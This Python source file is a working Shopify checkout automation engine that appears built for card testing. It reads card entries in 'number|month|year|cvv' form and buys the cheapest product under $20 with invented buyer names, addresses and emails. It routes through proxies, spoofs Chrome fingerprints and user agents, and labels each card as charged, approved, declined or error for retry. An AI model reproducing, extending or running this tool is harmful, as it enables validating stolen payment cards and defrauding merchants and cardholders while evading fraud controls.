"""
Shopify Checkout Engine — V14 WORKING
======================================
Poll retry on GENERIC_ERROR + ProcessingReceipt.
newss API compatible payload.
"""

import asyncio
import json
import os
import random
import re
import time
import urllib.parse
from dataclasses import dataclass
from enum import Enum
from typing import Dict, List, Optional, Tuple

from curl_cffi.requests import AsyncSession, RequestsError

import logging

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    datefmt="%H:%M:%S",
)
logger = logging.getLogger("engine")


# ──────────────────────── Config ─────────────────────────────────────

MAX_PRICE = float(os.environ.get("MAX_PRICE", "20.0"))
MIN_PRICE = float(os.environ.get("MIN_PRICE", "0.50"))
CONNECT_TIMEOUT = float(os.environ.get("CONNECT_TIMEOUT", "8"))
REQUEST_TIMEOUT = float(os.environ.get("REQUEST_TIMEOUT", "15"))
GATE_NAME = "Shopify Payments"
IMPERSONATE = "chrome124"

SOFT_ERRORS = {"WAITING_PENDING_TERMS", "TAX_NEW_TAX_MUST_BE_ACCEPTED"}
RETRY_ERRORS = {"GENERIC_ERROR", "PROCESSING_ERROR", "UNKNOWN"}

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
]


# ──────────────────────── Enums / Result types ───────────────────────

class CheckStatus(Enum):
    CHARGED = 0
    APPROVED = 1
    DECLINED = 2
    ERROR = 3


@dataclass
class CheckResult:
    card: str
    status: CheckStatus
    status_code: str = ""
    amount: str = ""
    currency: str = ""
    site_name: str = ""
    shop_url: str = ""
    receipt_url: str = ""
    error: Exception = None
    retryable: bool = False


# ──────────────────────── Faker ──────────────────────────────────────

FIRST_NAMES = ["James", "John", "Robert", "Michael", "William", "David", "Mary", "Patricia", "Jennifer", "Linda"]
LAST_NAMES = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis", "Rodriguez", "Martinez"]


def generate_random_email() -> str:
    name = random.choice(FIRST_NAMES).lower() + "." + random.choice(LAST_NAMES).lower() + str(random.randint(1, 999))
    return f"{name}@gmail.com"


# ──────────────────────── Address database ───────────────────────────

@dataclass
class Address:
    first_name: str
    last_name: str
    address1: str
    address2: str
    city: str
    country_code: str
    zone_code: str
    postal_code: str
    phone: str


US_ADDRESSES = [
    Address("James", "Anderson", "428 W 45th St", "Apt 4B", "New York", "US", "NY", "10036", "+12125550100"),
    Address("Michael", "Johnson", "123 Main St", "", "Portland", "US", "ME", "04101", "+12075550100"),
    Address("Robert", "Williams", "456 Elm St", "Suite 5", "Bangor", "US", "ME", "04401", "+12075550101"),
    Address("David", "Brown", "789 Oak Ave", "Apt 12", "Los Angeles", "US", "CA", "90028", "+13235550100"),
    Address("William", "Davis", "321 Pine St", "", "Houston", "US", "TX", "77002", "+17135550100"),
    Address("Richard", "Miller", "654 Cedar Rd", "Apt 3", "Chicago", "US", "IL", "60601", "+13125550100"),
    Address("Joseph", "Wilson", "987 Birch Ln", "", "Phoenix", "US", "AZ", "85001", "+16025550100"),
    Address("Thomas", "Moore", "159 Spruce Dr", "Suite 2", "Philadelphia", "US", "PA", "19103", "+12155550100"),
    Address("Charles", "Taylor", "753 Walnut St", "", "San Antonio", "US", "TX", "78205", "+12105550100"),
    Address("Daniel", "Anderson", "852 Maple Ave", "Apt 7", "San Diego", "US", "CA", "92101", "+16195550100"),
]


def random_address() -> Address:
    return random.choice(US_ADDRESSES)


# ──────────────────────── Error mapping ──────────────────────────────

_SHOPIFY_ERROR_MAP: Dict[str, str] = {
    "do not honor": "DO_NOT_HONOR",
    "do_not_honor": "DO_NOT_HONOR",
    "insufficient funds": "INSUFFICIENT_FUNDS",
    "insufficient_funds": "INSUFFICIENT_FUNDS",
    "card declined": "CARD_DECLINED",
    "card_declined": "CARD_DECLINED",
    "invalid card": "INVALID_CARD",
    "invalid_card": "INVALID_CARD",
    "expired card": "EXPIRED_CARD",
    "card expired": "EXPIRED_CARD",
    "incorrect cvc": "INVALID_CVC",
    "incorrect_cvc": "INVALID_CVC",
    "security code": "INVALID_CVC",
    "stolen card": "CARD_STOLEN",
    "lost card": "CARD_STOLEN",
    "pickup card": "CARD_STOLEN",
    "risky": "RISK_REJECTED",
    "fraud": "RISK_REJECTED",
    "suspected fraud": "RISK_REJECTED",
    "address": "ADDRESS_INVALID",
    "zip": "ZIP_INVALID",
    "postal": "ZIP_INVALID",
    "throttled": "THROTTLED",
    "too many": "THROTTLED",
    "rate limit": "THROTTLED",
    "gateway": "GATEWAY_ERROR",
    "inventory": "OUT_OF_STOCK",
    "out of stock": "OUT_OF_STOCK",
    "unavailable": "OUT_OF_STOCK",
    "captcha": "CAPTCHA_REQUIRED",
    "terms": "TERMS_REQUIRED",
    "payment method": "PAYMENT_METHOD_INVALID",
    "no session token": "NO_SESSION_TOKEN",
    "no_session_token": "NO_SESSION_TOKEN",
    "tokenization": "TOKENIZATION_FAILED",
    "tokenize": "TOKENIZATION_FAILED",
    # ⭐ GENERIC_ERROR မထည့် — retry လုပ်ရမယ်
    "there was a problem processing your order": "CARD_DECLINED",
    "problem processing": "CARD_DECLINED",
    "processing your order": "CARD_DECLINED",
    "unable to process": "CARD_DECLINED",
    "could not process": "CARD_DECLINED",
    "payment could not be processed": "CARD_DECLINED",
    "something went wrong": "CARD_DECLINED",
    "firstclasspackageinternationalservice": "CARD_DECLINED",
    "first_class_package_international_service": "CARD_DECLINED",
    "fedex_international_connect_plus": "CARD_DECLINED",
    "fedexinternationalconnectplus": "CARD_DECLINED",
    "prioritymail": "CARD_DECLINED",
    "priority_mail": "CARD_DECLINED",
    "expressmail": "CARD_DECLINED",
    "express_mail": "CARD_DECLINED",
    "shipping_method": "CARD_DECLINED",
    "international_shipping": "CARD_DECLINED",
}


def _map_error(raw: str) -> str:
    if not raw:
        return ""
    low = raw.lower().strip()
    # ⭐ Retry errors ကို မဖြတ်
    upper = raw.upper().strip()
    if upper in ("GENERIC_ERROR", "PROCESSING_ERROR", "UNKNOWN"):
        return upper
    sorted_keys = sorted(_SHOPIFY_ERROR_MAP.keys(), key=len, reverse=True)
    for keyword in sorted_keys:
        if keyword in low:
            return _SHOPIFY_ERROR_MAP[keyword]
    return raw.upper().replace(" ", "_")[:60]


# ──────────────────────── Static GraphQL queries ─────────────────────

_SUBMIT_QUERY = """mutation SubmitForCompletion($input:NegotiationInput!,$attemptToken:String!,$metafields:[MetafieldInput!],$postPurchaseInquiryResult:PostPurchaseInquiryResultCode,$analytics:AnalyticsInput){submitForCompletion(input:$input attemptToken:$attemptToken metafields:$metafields postPurchaseInquiryResult:$postPurchaseInquiryResult analytics:$analytics){...on SubmitSuccess{receipt{...ReceiptDetails __typename}__typename}...on SubmitAlreadyAccepted{receipt{...ReceiptDetails __typename}__typename}...on SubmitFailed{reason __typename}...on SubmitRejected{errors{...on NegotiationError{code localizedMessage __typename}__typename}__typename}...on Throttled{pollAfter pollUrl queueToken __typename}...on CheckpointDenied{redirectUrl __typename}...on SubmittedForCompletion{receipt{...ReceiptDetails __typename}__typename}__typename}}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id token orderIdentity{buyerIdentifier id __typename}__typename}...on ProcessingReceipt{id pollDelay __typename}...on ActionRequiredReceipt{id action{...on CompletePaymentChallenge{offsiteRedirect url __typename}__typename}__typename}...on FailedReceipt{id processingError{...on PaymentFailed{code messageUntranslated __typename}__typename}__typename}__typename}"""

_POLL_QUERY = """query PollForReceipt($receiptId:ID!,$sessionToken:String!){receipt(receiptId:$receiptId,sessionInput:{sessionToken:$sessionToken}){...ReceiptDetails __typename}}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id token orderIdentity{buyerIdentifier id __typename}__typename}...on ProcessingReceipt{id pollDelay __typename}...on ActionRequiredReceipt{id action{...on CompletePaymentChallenge{offsiteRedirect url __typename}__typename}__typename}...on FailedReceipt{id processingError{...on PaymentFailed{code messageUntranslated __typename}__typename}__typename}__typename}"""


# ──────────────────────── Shopify Engine ─────────────────────────────

class ShopifyEngine:
    def __init__(self, shop_url: str, proxy_url: str = ""):
        self.domain = shop_url if shop_url.startswith("http") else f"https://{shop_url}"
        self.proxy_url = proxy_url
        self.user_agent = random.choice(USER_AGENTS)

        self.user_info: Optional[Dict] = None
        self.product: Optional[Dict] = None
        self.cart_token: Optional[str] = None
        self.session_token: Optional[str] = None
        self.queue_token: Optional[str] = None
        self.stable_id: Optional[str] = None
        self.payment_method_id: Optional[str] = None
        self.payment_session_id: Optional[str] = None

        self.product_price: str = ""
        self.checkout_total: str = ""

        self._session: Optional[AsyncSession] = None

    async def _get_session(self) -> AsyncSession:
        if self._session is None:
            kwargs = {
                "impersonate": IMPERSONATE,
                "timeout": REQUEST_TIMEOUT,
                "headers": {
                    "User-Agent": self.user_agent,
                    "Accept-Language": "en-US,en;q=0.9",
                },
            }
            if self.proxy_url:
                kwargs["proxy"] = self.proxy_url
            self._session = AsyncSession(**kwargs)
        return self._session

    async def close(self):
        if self._session:
            try:
                await self._session.close()
            except Exception:
                pass
            self._session = None

    async def _req(self, method: str, url: str, **kwargs):
        session = await self._get_session()
        try:
            return await session.request(method, url, **kwargs)
        except Exception as e:
            logger.warning("HTTP %s %s failed: %s", method, url, e)
            return None

    @staticmethod
    def _json(r):
        try:
            return r.json()
        except Exception:
            return None

    @staticmethod
    def _between(text: str, start: str, end: str) -> Optional[str]:
        try:
            s = text.index(start) + len(start)
            e = text.index(end, s)
            return text[s:e]
        except ValueError:
            return None

    # ── user info ──

    def get_user_info(self) -> Dict:
        if self.user_info:
            return self.user_info
        addr = random_address()
        self.user_info = {
            "fname": addr.first_name,
            "lname": addr.last_name,
            "email": generate_random_email(),
            "phone": addr.phone,
            "add": addr.address1,
            "city": addr.city,
            "state_short": addr.zone_code,
            "zip": addr.postal_code,
        }
        return self.user_info

    # ── products ──

    async def get_products(self) -> Optional[Dict]:
        if self.product:
            return self.product

        r = await self._req("GET", f"{self.domain}/products.json?limit=250",
                            headers={"Accept": "application/json"})
        if not r or r.status_code != 200:
            return None
        data = self._json(r)
        if not data:
            return None

        products = data.get("products", [])
        if not products:
            return None

        blacklist = ["sample", "free", "gift", "test"]
        valid: List[Dict] = []

        for p in products:
            title = p.get("title", "").lower()
            if any(w in title for w in blacklist):
                continue
            for v in p.get("variants", []):
                if not v.get("available", True):
                    continue
                if v.get("inventory_quantity") is not None and v["inventory_quantity"] <= 0:
                    continue
                try:
                    price = float(v.get("price", 999))
                except (ValueError, TypeError):
                    continue
                if not (MIN_PRICE <= price <= MAX_PRICE):
                    continue
                valid.append({
                    "title": p["title"],
                    "handle": p["handle"],
                    "variant_id": v["id"],
                    "price": price,
                })

        if not valid:
            return None

        valid.sort(key=lambda x: x["price"])
        self.product = valid[0]
        self.product_price = f"{self.product['price']:.2f}"
        logger.info("Selected product: %r price=$%.2f", self.product["title"], self.product["price"])
        return self.product

    # ── step 1 ──

    async def visit_product_page(self) -> bool:
        p = await self.get_products()
        if not p:
            return False
        r = await self._req("GET", f"{self.domain}/products/{p['handle']}",
                            headers={
                                "Accept": "text/html,application/xhtml+xml,*/*;q=0.8",
                                "Referer": f"{self.domain}/",
                            })
        return bool(r and r.status_code == 200)

    # ── step 2 ──

    async def add_to_cart(self) -> Optional[str]:
        p = await self.get_products()
        if not p:
            return None

        headers = {
            "Accept": "application/json",
            "Content-Type": "application/x-www-form-urlencoded",
            "Referer": f"{self.domain}/",
        }

        await self._req("GET", f"{self.domain}/cart.js", headers=headers)
        r = await self._req("POST", f"{self.domain}/cart/add.js", headers=headers,
                            data={"id": str(p["variant_id"]), "quantity": "1", "form_type": "product"})
        if not r or r.status_code != 200:
            return None

        cr = await self._req("GET", f"{self.domain}/cart.js", headers=headers)
        if not cr:
            return None
        cd = self._json(cr)
        if not cd:
            return None
        self.cart_token = cd.get("token")
        return self.cart_token

    # ── step 3 ──

    async def init_checkout(self) -> bool:
        headers = {
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Content-Type": "application/x-www-form-urlencoded",
            "Origin": self.domain,
            "Referer": f"{self.domain}/cart",
            "Upgrade-Insecure-Requests": "1",
        }

        await self._req("GET", f"{self.domain}/checkout", headers=headers)
        r = await self._req("POST", f"{self.domain}/cart", headers=headers,
                            data={"checkout": "", "updates[]": "1"}, allow_redirects=True)
        if not r:
            return False

        text = r.text
        for pat, grp in [
            (r'name="serialized-sessionToken"\s+content="&quot;([^"]+)&quot;"', 1),
            (r'"serializedSessionToken":"([^"]+)"', 1),
            (r'"sessionToken":"([^"]+)"', 1),
        ]:
            m = re.search(pat, text)
            if m:
                self.session_token = m.group(grp)
                break

        self.queue_token = self._between(text, "queueToken&quot;:&quot;", "&quot;")
        self.stable_id = self._between(text, "stableId&quot;:&quot;", "&quot;")
        self.payment_method_id = self._between(text, "paymentMethodIdentifier&quot;:&quot;", "&quot;")

        m = re.search(r'"totalAmount"\s*:\s*\{\s*"value"\s*:\s*\{\s*"amount"\s*:\s*"([^"]+)"', text)
        if m:
            self.checkout_total = m.group(1)

        # ⭐ Debug log
        logger.info(
            "checkout init — session=%s queue=%s stable=%s pm=%s",
            (self.session_token or "MISS")[:20],
            (self.queue_token or "MISS")[:20],
            (self.stable_id or "MISS")[:20],
            (self.payment_method_id or "MISS")[:20],
        )

        return all([self.session_token, self.queue_token, self.stable_id, self.payment_method_id])

    # ── step 4 ──

    async def create_payment_session(self, cc: str, mon, year, cvv) -> Optional[str]:
        ui = self.get_user_info()
        endpoints = [
            "https://deposit.us.shopifycs.com/sessions",
            "https://checkout.pci.shopifyinc.com/sessions",
            "https://checkout.shopifycs.com/sessions",
        ]

        for ep in endpoints:
            try:
                headers = {
                    "Authority": urllib.parse.urlparse(ep).netloc,
                    "Accept": "application/json",
                    "Content-Type": "application/json",
                    "Origin": "https://checkout.shopifycs.com",
                    "Referer": "https://checkout.shopifycs.com/",
                    "User-Agent": self.user_agent,
                }
                data = {
                    "credit_card": {
                        "number": str(cc).replace(" ", ""),
                        "month": int(mon),
                        "year": int(year),
                        "verification_value": str(cvv),
                        "name": f"{ui['fname']} {ui['lname']}",
                    },
                    "payment_session_scope": urllib.parse.urlparse(self.domain).netloc,
                }
                session = await self._get_session()
                r = await session.post(ep, headers=headers, json=data,
                                       timeout=REQUEST_TIMEOUT)
                if r.status_code == 200:
                    j = r.json()
                    if "id" in j:
                        self.payment_session_id = j["id"]
                        return self.payment_session_id
            except Exception as e:
                logger.warning("PCI endpoint %s failed: %s", ep, e)
                continue
        return None

    # ── step 5: payload ──

    def _build_submit_payload(self) -> Dict:
        ui = self.get_user_info()
        p = self.product
        vid = p["variant_id"]
        addr = {
            "address1": ui["add"],
            "address2": "",
            "city": ui["city"],
            "countryCode": "US",
            "postalCode": ui["zip"],
            "company": "",
            "firstName": ui["fname"],
            "lastName": ui["lname"],
            "zoneCode": ui["state_short"],
            "phone": ui["phone"],
        }

        return {
            "query": _SUBMIT_QUERY,
            "variables": {
                "input": {
                    "checkpointData": None,
                    "sessionInput": {"sessionToken": self.session_token},
                    "queueToken": self.queue_token,
                    "discounts": {"lines": [], "acceptUnexpectedDiscounts": True},
                    "delivery": {
                        "deliveryLines": [{
                            "selectedDeliveryStrategy": {
                                "deliveryStrategyMatchingConditions": {
                                    "estimatedTimeInTransit": {"any": True},
                                    "shipments": {"any": True},
                                },
                                "options": {},
                            },
                            "targetMerchandiseLines": {"lines": [{"stableId": self.stable_id}]},
                            "destination": {"streetAddress": addr},
                            "deliveryMethodTypes": ["SHIPPING"],
                            "expectedTotalPrice": {"any": True},
                            "destinationChanged": True,
                        }],
                        "noDeliveryRequired": [],
                        "useProgressiveRates": False,
                        "prefetchShippingRatesStrategy": None,
                        "supportsSplitShipping": True,
                    },
                    "merchandise": {
                        "merchandiseLines": [{
                            "stableId": self.stable_id,
                            "merchandise": {
                                "productVariantReference": {
                                    "id": f"gid://shopify/ProductVariantMerchandise/{vid}",
                                    "variantId": f"gid://shopify/ProductVariant/{vid}",
                                    "properties": [],
                                    "sellingPlanId": None,
                                    "sellingPlanDigest": None,
                                }
                            },
                            "quantity": {"items": {"value": 1}},
                            "expectedTotalPrice": {"any": True},
                            "lineComponentsSource": None,
                            "lineComponents": [],
                        }]
                    },
                    "memberships": {"memberships": []},
                    "payment": {
                        "totalAmount": {"any": True},
                        "paymentLines": [{
                            "paymentMethod": {
                                "directPaymentMethod": {
                                    "paymentMethodIdentifier": self.payment_method_id,
                                    "sessionId": self.payment_session_id,
                                    "billingAddress": {"streetAddress": addr},
                                    "cardSource": None,
                                }
                            },
                            "amount": {"any": True},
                            "dueAt": None,
                        }],
                        "billingAddress": {"streetAddress": addr},
                    },
                    "buyerIdentity": {
                        "customer": {"presentmentCurrency": "USD", "countryCode": "US"},
                        "email": ui["email"],
                        "emailChanged": False,
                        "phoneCountryCode": "US",
                        "marketingConsent": [],
                        "shopPayOptInPhone": {"countryCode": "US"},
                        "rememberMe": False,
                    },
                    "tip": {"tipLines": []},
                    "taxes": {
                        "proposedAllocations": None,
                        "proposedTotalAmount": {"any": True},
                        "proposedTotalIncludedAmount": None,
                        "proposedMixedStateTotalAmount": None,
                        "proposedExemptions": [],
                    },
                    "note": {"message": None, "customAttributes": []},
                    "localizationExtension": {"fields": []},
                    "nonNegotiableTerms": None,
                    "scriptFingerprint": {
                        "signature": None,
                        "signatureUuid": None,
                        "lineItemScriptChanges": [],
                        "paymentScriptChanges": [],
                        "shippingScriptChanges": [],
                    },
                    "optionalDuties": {"buyerRefusesDuties": False},
                    "cartMetafields": [],
                },
                "attemptToken": f"{self.cart_token}-{random.random()}",
                "metafields": [],
                "analytics": {"requestUrl": f"{self.domain}/checkouts/cn/{self.cart_token}"},
            },
            "operationName": "SubmitForCompletion",
        }

    # ── step 6 ──

    async def submit_payment(self) -> Dict:
        if not all([self.session_token, self.payment_session_id, self.cart_token]):
            return {"status": "failed", "reason": "missing_tokens"}

        gql_headers = {
            "Authority": urllib.parse.urlparse(self.domain).netloc,
            "Accept": "application/json",
            "Accept-Language": "en-US,en;q=0.9",
            "Content-Type": "application/json",
            "Origin": self.domain,
            "Referer": f"{self.domain}/",
            "User-Agent": self.user_agent,
            "X-Checkout-One-Session-Token": self.session_token,
            "X-Checkout-Web-Deploy-Stage": "production",
            "X-Checkout-Web-Server-Handling": "fast",
            "X-Checkout-Web-Source-Id": self.cart_token,
        }

        MAX_ATTEMPTS = 2
        for attempt in range(MAX_ATTEMPTS):
            payload = self._build_submit_payload()
            try:
                session = await self._get_session()
                r = await session.post(
                    f"{self.domain}/checkouts/unstable/graphql",
                    headers=gql_headers, json=payload, timeout=REQUEST_TIMEOUT,
                )
                if r.status_code != 200:
                    if attempt < MAX_ATTEMPTS - 1:
                        await asyncio.sleep(2)
                        continue
                    return {"status": "failed", "reason": f"http_{r.status_code}"}

                result = r.json()
                logger.info("submit response: %s", json.dumps(result)[:500])

                completion = result.get("data", {}).get("submitForCompletion", {})

                try:
                    total_match = re.search(
                        r'"checkoutTotal"\s*:\s*\{\s*"value"\s*:\s*\{\s*"amount"\s*:\s*"([^"]+)"',
                        json.dumps(result))
                    if total_match:
                        self.checkout_total = total_match.group(1)
                except Exception:
                    pass

                if completion.get("errors"):
                    codes = [e.get("code") for e in completion["errors"] if "code" in e]
                    non_soft = [c for c in codes if c not in SOFT_ERRORS]
                    if not non_soft and attempt < MAX_ATTEMPTS - 1:
                        await asyncio.sleep(3)
                        continue
                    if non_soft:
                        mapped = [_map_error(c) for c in non_soft]
                        return {"status": "rejected", "errors": mapped}

                if completion.get("__typename") == "Throttled":
                    if attempt < MAX_ATTEMPTS - 1:
                        await asyncio.sleep(3)
                        continue
                    return {"status": "processing"}

                if completion.get("reason"):
                    return {"status": "failed", "reason": completion["reason"]}

                if completion.get("receipt"):
                    rid = completion["receipt"].get("id")
                    if rid:
                        return await self._poll_receipt(rid, gql_headers)

                break
            except Exception as e:
                logger.warning("submit attempt %d failed: %s", attempt, e)
                if attempt < MAX_ATTEMPTS - 1:
                    await asyncio.sleep(2)
                    continue
                return {"status": "failed", "reason": str(e)}

        return {"status": "unknown"}

    # ── step 7: poll with retry ──

    async def _poll_receipt(self, rid: str, headers: Dict) -> Dict:
        """
        Poll for receipt with retry on GENERIC_ERROR / ProcessingReceipt.
        - Up to 10 polls, 2s each = 20s max
        - GENERIC_ERROR / PROCESSING_ERROR / UNKNOWN → retry
        - ProcessingReceipt → retry
        - ProcessedReceipt → CHARGED
        - ActionRequiredReceipt → 3DS
        - CARD_DECLINED / INSUFFICIENT_FUNDS → DECLINED
        """
        for i in range(10):
            await asyncio.sleep(2.0)
            try:
                session = await self._get_session()
                r = await session.post(
                    f"{self.domain}/checkouts/unstable/graphql",
                    headers=headers,
                    json={
                        "query": _POLL_QUERY,
                        "variables": {"receiptId": rid, "sessionToken": self.session_token},
                        "operationName": "PollForReceipt",
                    },
                    timeout=REQUEST_TIMEOUT,
                )
                if r.status_code != 200:
                    logger.warning("poll #%d HTTP %d", i, r.status_code)
                    continue

                data = r.json()
                logger.info("poll #%d: %s", i, json.dumps(data)[:400])

                receipt = data.get("data", {}).get("receipt", {})
                tn = receipt.get("__typename")

                # ⭐ CHARGED
                if tn == "ProcessedReceipt" or "orderIdentity" in receipt:
                    oid = receipt.get("orderIdentity", {}).get("id", "N/A")
                    return {"status": "charged", "order_id": oid}

                # ⭐ 3DS
                elif tn == "ActionRequiredReceipt":
                    return {"status": "3ds_required", "data": data}

                # ⭐ Still processing → retry
                elif tn == "ProcessingReceipt":
                    logger.info("poll #%d still processing, retry...", i)
                    continue

                # ⭐ FailedReceipt → check code
                elif tn == "FailedReceipt":
                    pe = receipt.get("processingError", {})
                    code = pe.get("code", "CARD_DECLINED")
                    msg = pe.get("messageUntranslated", "")

                    # ⭐ GENERIC_ERROR → retry
                    if code.upper() in RETRY_ERRORS:
                        logger.info("poll #%d %s → retry...", i, code)
                        continue

                    # ⭐ Final decline
                    mapped = _map_error(code) or _map_error(msg) or "CARD_DECLINED"
                    logger.info("poll #%d FailedReceipt code=%s msg=%s", i, code, msg)
                    return {"status": "declined", "code": mapped, "message": msg}

            except Exception as e:
                logger.warning("poll #%d exception: %s", i, e)
                continue

        return {"status": "timeout"}

    # ── full checkout ──

    async def checkout(self, cc: str, mon, year, cvv) -> Dict:
        try:
            if not await self.visit_product_page():
                return {"status": "failed", "step": 1, "reason": "CART_FAILED"}
            if not await self.add_to_cart():
                return {"status": "failed", "step": 2, "reason": "CART_FAILED"}
            if not await self.init_checkout():
                return {"status": "failed", "step": 3, "reason": "NO_SESSION_TOKEN"}
            await asyncio.sleep(0.3)
            if not await self.create_payment_session(cc, mon, year, cvv):
                return {"status": "failed", "step": 4, "reason": "TOKENIZATION_FAILED"}
            await asyncio.sleep(0.3)
            return await self.submit_payment()
        except Exception as e:
            logger.warning("checkout exception: %s", e)
            return {"status": "failed", "reason": str(e)}
        finally:
            self.reset()

    def reset(self):
        self.cart_token = None
        self.session_token = None
        self.queue_token = None
        self.stable_id = None
        self.payment_method_id = None
        self.payment_session_id = None


# ──────────────────────── Public API ─────────────────────────────────

def parse_card_entry(card_entry: str) -> Tuple[str, int, int, str]:
    card_parts = card_entry.strip().split('|')
    if len(card_parts) != 4:
        raise Exception(f"CARD_INVALID: {card_entry}")
    try:
        card_month = int(card_parts[1])
        card_year = int(card_parts[2])
        if card_year < 100:
            card_year += 2000
    except ValueError as e:
        raise Exception(f"CARD_INVALID: {e}")
    return card_parts[0], card_month, card_year, card_parts[3]


def normalize_proxy(raw: str) -> str:
    p = raw.strip()
    if not p:
        raise Exception("empty proxy")
    if '://' not in p:
        parts = p.split(':')
        if len(parts) == 4:
            p = f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
        else:
            p = "http://" + p
    parsed = urllib.parse.urlparse(p)
    if not parsed.netloc:
        raise Exception(f"invalid proxy format: {raw}")
    return p


async def _run_checkout_async(shop_url: str, card_entry: str, proxy_url: str = "") -> CheckResult:
    site_name = shop_url.replace("https://", "").replace("http://", "")
    result = CheckResult(
        card=card_entry, shop_url=shop_url, site_name=site_name,
        currency="USD", status=CheckStatus.ERROR,
    )

    try:
        card_number, card_month, card_year, card_cvv = parse_card_entry(card_entry)
    except Exception as e:
        result.error = e
        result.status_code = "INVALID_CARD"
        return result

    engine = ShopifyEngine(shop_url, proxy_url)
    try:
        r = await engine.checkout(card_number, card_month, card_year, card_cvv)
    except Exception as e:
        logger.warning("engine exception: %s", e)
        result.status = CheckStatus.ERROR
        result.status_code = "ENGINE_ERROR"
        result.error = e
        result.retryable = True
        return result
    finally:
        await engine.close()

    status = r.get("status", "unknown")
    price_value = engine.checkout_total or engine.product_price or ""
    if price_value:
        price_value = str(price_value).replace(" USD", "").replace("$", "").strip()

    if status == "charged":
        result.status = CheckStatus.CHARGED
        result.status_code = "ORDER_PLACED"
        result.amount = price_value
        result.receipt_url = r.get("order_id", "")

    elif status == "3ds_required":
        result.status = CheckStatus.APPROVED
        result.status_code = "3DS_REQUIRED"
        result.amount = price_value

    elif status == "declined":
        code = r.get("code", "CARD_DECLINED")
        mapped = _map_error(code) or code or "CARD_DECLINED"
        result.status = CheckStatus.DECLINED
        result.status_code = mapped
        result.amount = price_value
        result.error = Exception(mapped)

    elif status == "rejected":
        errors = r.get("errors", []) or ["CARD_DECLINED"]
        code = errors[0]
        mapped = _map_error(code) or code or "CARD_DECLINED"
        result.status = CheckStatus.DECLINED
        result.status_code = mapped
        result.amount = price_value
        result.error = Exception(mapped)

    elif status == "processing":
        result.status = CheckStatus.APPROVED
        result.status_code = "PROCESSING"
        result.amount = price_value

    elif status == "failed":
        reason = r.get("reason", "SUBMIT_FAILED")
        result.amount = price_value
        if "CAPTCHA" in reason:
            result.status = CheckStatus.ERROR
            result.status_code = "CAPTCHA_REQUIRED"
            result.retryable = True
        elif "CART_FAILED" in reason:
            result.status = CheckStatus.ERROR
            result.status_code = "CART_FAILED"
            result.retryable = True
        elif "TOKENIZATION" in reason:
            result.status = CheckStatus.ERROR
            result.status_code = "TOKENIZATION_FAILED"
            result.retryable = True
        elif "NO_SESSION" in reason:
            result.status = CheckStatus.ERROR
            result.status_code = "NO_SESSION_TOKEN"
            result.retryable = True
        else:
            result.status = CheckStatus.ERROR
            result.status_code = "SUBMIT_FAILED"
            result.retryable = True
        result.error = Exception(reason)

    elif status == "timeout":
        result.status = CheckStatus.DECLINED
        result.status_code = "CARD_DECLINED"
        result.amount = price_value
        result.error = Exception("CARD_DECLINED")

    else:
        result.status = CheckStatus.DECLINED
        result.status_code = "CARD_DECLINED"
        result.amount = price_value
        result.error = Exception("CARD_DECLINED")

    return result


def run_checkout_for_card(shop_url: str, card_entry: str, proxy_url: str = "", low: bool = True) -> CheckResult:
    import concurrent.futures

    def _run():
        return asyncio.run(_run_checkout_async(shop_url, card_entry, proxy_url))

    try:
        return _run()
    except RuntimeError as e:
        if "already running" in str(e).lower() or "no running event loop" in str(e).lower():
            with concurrent.futures.ThreadPoolExecutor(max_workers=1) as pool:
                future = pool.submit(_run)
                return future.result(timeout=REQUEST_TIMEOUT + 60)
        raise